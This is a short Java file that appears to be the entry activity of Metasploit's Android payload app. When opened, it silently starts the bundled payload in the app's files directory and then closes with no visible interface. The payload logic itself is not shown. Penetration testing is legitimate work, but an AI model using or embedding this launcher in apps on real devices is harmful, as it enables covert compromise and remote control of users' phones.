package com.metasploit.stage;

import android.app.Activity;
import android.os.Bundle;

public class MainActivity extends Activity
{
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Payload.startInPath(getFilesDir().toString());
        finish();
    }
}
